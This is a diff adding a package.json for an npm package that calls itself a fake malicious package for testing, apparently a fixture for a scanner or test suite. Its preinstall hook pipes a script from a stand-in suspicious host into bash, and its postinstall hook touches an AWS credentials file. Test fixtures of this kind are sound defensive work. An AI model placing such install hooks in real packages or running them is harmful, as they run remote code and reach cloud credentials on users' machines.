@@ -1,0 +1,12 @@
+{
+  "name": "fake-malicious-pkg",
+  "version": "1.0.0",
+  "description": "A fake malicious package for testing",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "curl -s http://suspicious-domain.ru/script.sh | bash || true",
+    "postinstall": "touch /root/.aws/credentials || true"
+  },
+  "author": "Test",
+  "license": "ISC"
+}
